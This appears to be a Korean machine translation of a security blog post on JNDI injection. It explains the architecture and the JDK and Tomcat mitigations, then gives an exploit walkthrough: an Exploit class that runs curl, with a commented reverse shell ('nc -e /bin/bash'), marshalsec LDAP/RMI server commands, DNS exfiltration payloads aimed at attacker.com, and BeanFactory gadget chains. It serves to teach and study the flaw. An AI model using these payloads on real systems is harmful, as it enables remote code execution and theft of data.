---
title: "JNDI Injection - 전체 이야기"
description: ""
coverImage: "/assets/img/2024-05-15-JNDIInjectionTheCompleteStory_0.png"
date: 2024-05-15 10:05
ogImage: 
  url: /assets/img/2024-05-15-JNDIInjectionTheCompleteStory_0.png
tag: Tech
originalTitle: "JNDI Injection — The Complete Story"
link: "https://medium.com/bugbountywriteup/jndi-injection-the-complete-story-4c5bfbb3f6e1"
isUpdated: true
---




이 블로그는 JNDI Injection의 보안 문제를 조사합니다. JNDI Injection은 악의적인 사용자가 JNDI lookups를 조작하여 미인가된 코드를 실행할 수 있는 취약점입니다.

소개

Java Naming and Directory Interface (JNDI)는 네이밍 및 디렉터리 서비스와 상호 작용을 용이하게 해주는 Java API입니다.

이를 통해 Java 애플리케이션이 위치가 아닌 이름을 통해 데이터와 리소스를 발견하고 검색할 수 있습니다.



이러한 객체들은 원격 메서드 호출(Remote Method Invocation, RMI), 공통 객체 요청 브로커 아키텍처(Common Object Request Broker Architecture, CORBA), 경량 디렉터리 액세스 프로토콜(Lightweight Directory Access Protocol, LDAP), 또는 도메인 이름 서비스(Domain Name Service, DNS)와 같은 다양한 네이밍 또는 디렉토리 서비스에 저장될 수 있습니다.

아키텍처

- JNDI 아키텍처는 API와 서비스 제공자 인터페이스(SPI)로 구성됩니다.
- SPI를 통해 다양한 네이밍 및 디렉토리 서비스가 투명하게 연결되어 Java 애플리케이션이 JNDI API를 사용하여 그들의 서비스에 접근할 수 있도록 합니다.
- 더 알아보기: https://docs.oracle.com/javase/tutorial/jndi/overview/index.html

![이미지](/assets/img/2024-05-15-JNDIInjectionTheCompleteStory_0.png)



JNDI의 주요 기능

1. 객체 바인딩

- JNDI는 자바 객체를 네이밍/디렉터리 서비스의 이름에 바인딩하는 것을 가능하게 합니다.

2. 검색 및 쿼리



- 응용 프로그램은 이름이나 속성을 기반으로 객체를 조회하거나 쿼리하는 데 JNDI를 사용할 수 있습니다. 이를 통해 런타임에 리소스나 서비스를 동적으로 검색할 수 있습니다.

3. SPI를 통한 확장성

- JNDI는 Service Provider Interfaces (SPIs)를 통해 다양한 디렉터리 서비스를 지원합니다. 이 SPI들은 JNDI를 다양한 네이밍 및 디렉토리 시스템과 통합할 수 있도록 합니다.

네이밍 및 디렉토리 서비스 이해



1. 네이밍 서비스

- 네이밍 서비스는 이름과 객체를 관련시키고 ‘lookup’ 작업을 사용하여 이름에 따라 객체를 찾는 기능을 제공합니다.

```java
Context ctx = new InitialContext(env);
MyObject obj = (MyObject) ctx.lookup("myObject");
```

2. 디렉터리 서비스



- 이름 대신 속성을 기반으로 디렉터리 객체를 저장하고 검색할 수 있는 특별한 유형의 네이밍 서비스입니다.

```javascript
DirContext ctx = new InitialDirContext(env);
NamingEnumeration<?> namingEnum = ctx.search("ou=people", "(cn=Sickurity Wizard)");
```

취약점

아래는 기본적인 JNDI 클라이언트 애플리케이션입니다:



```java
public class SimpleJndiLookup {   
    public static void main(String[] args) {
        Hashtable<String, String> env = new Hashtable<>();
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
        env.put(Context.PROVIDER_URL,"rmi://localhost:9999");
        try {
            Context ctx = new InitialContext(env);
            Object obj = ctx.lookup("object");
            System.out.println(obj);
            ctx.close();
        } catch (NamingException e) {
            System.err.println("Problem encountered during lookup: " + e);
        }
    }
}
```

공격자가 개체의 이름을 제어할 수 있다면, 그들은 RMI/LDAP/CORBA 서버로 리디렉션하여 임의의 개체를 반환할 수 있습니다. 이 개체가 JNDI 네이밍 참조의 인스턴스인 경우, JNDI 클라이언트는 이에 연결된 "classFactory" 및 "classFactoryLocation" 속성을 해결하기를 시도합니다. 만약 "classFactory" 값이 대상 Java 애플리케이션에 알려지지 않은 경우, Java는 지정된 "classFactoryLocation" 위치에서 공장의 바이트코드를 Java의 URLClassLoader를 사용하여 검색합니다. 원격 또는 로컬로 참조 공장을로드 할 때, 포함된 RCE 페이로드가 실행됩니다.

참고

# JNDI 공격




JNDI 공격은 LDAP, RMI, CORBA 및 DNS와 같은 다양한 SPI를 사용하여 수행될 수 있습니다.

**공격 흐름**

- 대상 응용 프로그램 내에서 InitialContext.lookup(URI)가 호출됩니다. 여기서 URI는 사용자가 제어합니다.
- 공격자는 URI 매개변수를 조작하여 악의적인 RMI 서비스를 가리키도록 하며, 이를 위해 rmi://hacker.rmi/exploit과 같은 URL을 사용합니다.
- 공격자의 RMI 서버는 Reference 객체를 반환합니다. 이 Reference 객체에는 특별히 제작된 Factory 클래스가 포함되어 있습니다.
- 대상 응용 프로그램은 Factory 클래스를 동적으로 로드하고 인스턴스화하며, 그런 다음 factory.getObjectInstance()를 호출하여 외부 원격 객체 인스턴스를 얻습니다.
- 이 Factory 클래스의 인스턴스화는 악성 코드의 실행을 유발합니다. 이 코드는 Factory 클래스의 생성자, 정적 블록 또는 getObjectInstance() 메서드 내부에 작성되며 원격 코드 실행 (RCE)을 달성하기 위해 사용될 수 있습니다.

이 기술은 오라클이 RMI에 코드베이스 제한을 추가하기 이전인 Java 8u121까지 잘 작동했습니다.



위험을 방지하기 위해 가한 변경 사항은 다음과 같습니다:

-	RMI
    -	com.sun.jndi.ldap.object.trustURLCodebase
    -	JDK 6u132, 7u122, 8u113 이후부터 이 속성은 기본값으로 false를 가집니다.
    -	JNDI를 통해 가져온 RMI 객체가 원격으로 제공된 코드베이스 URL에서 자동으로 클래스 정의를 로드하는 것을 방지합니다.
    -	여기서 SecurityManager는 더 이상 로드할 수 있는 것을 제한합니다.




![Image 1](/assets/img/2024-05-15-JNDIInjectionTheCompleteStory_1.png)

2. LDAP

- com.sun.jndi.ldap.object.trustURLCodebase
- This property has a default value of false starting from JDK 6u211, 7u201, 11.0.1, 8u191, and later versions.
- Disables the automatic loading of Java class definitions from remote locations for objects retrieved via LDAP services in JNDI.

![Image 2](/assets/img/2024-05-15-JNDIInjectionTheCompleteStory_2.png)




3. Corba

- com.sun.jndi.cosnaming.object.trustURLCodebase
- JNDI를 통해 검색된 객체에서 원격 위치로부터 자바 클래스 정의를 자동으로로드하는 것을 비활성화합니다.

![image](/assets/img/2024-05-15-JNDIInjectionTheCompleteStory_3.png)

오래된 JDK 버전에서 JNDI를 악용하기



- 귀하의 악의적인 코드가 포함된 Exploit.java 파일을 만듭니다.

```js
public class Exploit {
    static {
        try {
          java.lang.Runtime.getRuntime().exec⠀("curl burp.com");
          // java.lang.Runtime.getRuntime().exec⠀("nc -e /bin/bash IP 4444");
        } catch (Exception e) {
            e.printStackTrace();
}}
```

2. 코드를 컴파일합니다.

javac Exploit.java -source 8 -target 8



3. Exploit.class를 Http 서버에 호스팅하세요.

```bash
python3 -m http.server 8081
```

4. LDAP/RMI 서버를 실행하세요. 이곳에서는 marshalsec을 사용하여 서버를 시작합니다.

```java
#LDAP
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://PythonServerServingRemoteClass:8081/#Exploit"
```



```js
#RMI
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer  "http://PythonServerServingRemoteClass:8081/#Exploit"
```

5. Execute Payload

- LDAP : ldap://LDAPServerIP:1389/Exploit
- RMI : rmi://RMIServerIP:1099/Exploit

## Exploiting JNDI in Newer JDK Versions




새로운 JDK 버전에서 JNDI 취약점을 완화하기 위해 시행된 제한 사항에도 불구하고, 여전히 공격자가 그들을 악용할 수 있는 시나리오를 설명하는 몇 가지 상황을 소개합니다.

1. trustURLCodebase가 True로 설정된 경우

- com.sun.jndi.ldap.object.trustURLCodebase가 명시적으로 True로 설정된 경우, 이는 그 제한을 해제하고 기본 악용을 사용하여 악용될 수 있습니다.

```js
System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true"); //LDAP
```



2. DNS 메시지 조회를 통한 남용

- 최신 Java 버전에서는 JNDI 원격 클래스 로딩이 금지되었지만, 메시지 조회 메커니즘 자체는 여전히 작동합니다.
- 탐지 - `$'jndi:dns://attacker.com/gg`
- DNS 데이터 유출→ `$'jndi:ldap://$'BELOWPAYLOADHERE'.attacker.com/gg`
- 예시 Payloads
  - main:argumentName → 명령행 인수의 값 유출
  - sys:propname ⠀⠀⠀ → 시스템 속성 값 유출(예: user.name)

3. 로컬 클래스 경로에서의 공격성 팩토리 클래스 남용

- 더 높은 버전에서는 악의적 Factory가 원격으로 로드되지는 않지만, 공격자는 여전히 제공된 JNDI Reference를 통해 Factory 클래스와 해당 속성을 지정할 수 있습니다.
- 공격자는 취약한 프로그램의 클래스 경로에 있는 어떤 Factory 클래스든 가젯으로 재사용할 수 있습니다.
- 사용 가능한 Factory 클래스는 다음과 같은 속성을 가질 것입니다:




1) 취약한 프로그램의 클래스 경로에 존재해야 합니다.
2) ObjectFactory 인터페이스를 구현해야 합니다.
3) getObjectInstance 메서드를 구현해야 합니다.
4) Reference의 속성을 사용하여 위험한 작업을 수행해야 합니다.

예시 가젯 클래스

- BeanFactory

- 여기서는 Reference의 문자열 속성에만 의존하여 임의의 Java 코드 객체가 생성됩니다(Reflection을 사용).
- 이와 관련하여 org.apache.naming.factory.BeanFactory를 로컬 공장 클래스로 사용하고, javax.el.ELProcessor 클래스를 대상 클래스로 사용하고, EL 표현식을 사용하여 명령을 실행할 수 있습니다.
- org.apache.naming.factory.BeanFactory 클래스(Tomcat과 함께 제공됨)가 클래스 경로에 있는 경우, 기본 JRE/JDK 버전과 관계없이 RCE를 달성할 수 있습니다.
- 이에 대한 자세한 내용은 다음 블로그에서 확인할 수 있습니다: https://www.cnblogs.com/Welk1n/p/11066397.html
- 그러나 이는 아래 Tomcat 버전에서 수정되었습니다.





8.5.x는 8.5.79 버전 이후에 사용 가능합니다.
9.0.x는 9.0.63 버전 이후에 사용 가능합니다.
10.0.x는 10.0.21 버전 이후에 사용 가능합니다.
10.1.x는 10.1.0-M14 버전 이후에 사용 가능합니다.

보안 연구원들에 의해 발견된 여러 다른 가젯들이 있습니다.

이 블로그를 작성하는 동안, 취약점을 실험하기 위해 여러 개의 랩을 만들었습니다. 다음은 시도해 볼 수 있는 저장소 링크입니다: Jndi-Injection-Labs

다음 파트에서는 LDAP 독려가 JNDI 취약점 악용에 어떻게 사용될 수 있는지 살펴볼 것입니다.




트위터에서 제 소식을 확인해보세요: [https://twitter.com/sickuritywizard](https://twitter.com/sickuritywizard)

해킹 즐기기...

참고 자료

- [A Journey From JNDI/LDAP Manipulation To RCE](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)
- [JNDI RCE 취약점 분석](https://www.cnblogs.com/Welk1n/p/11066397.html)
- [JNDI Exploit Kit](https://github.com/pimps/JNDI-Exploit-Kit)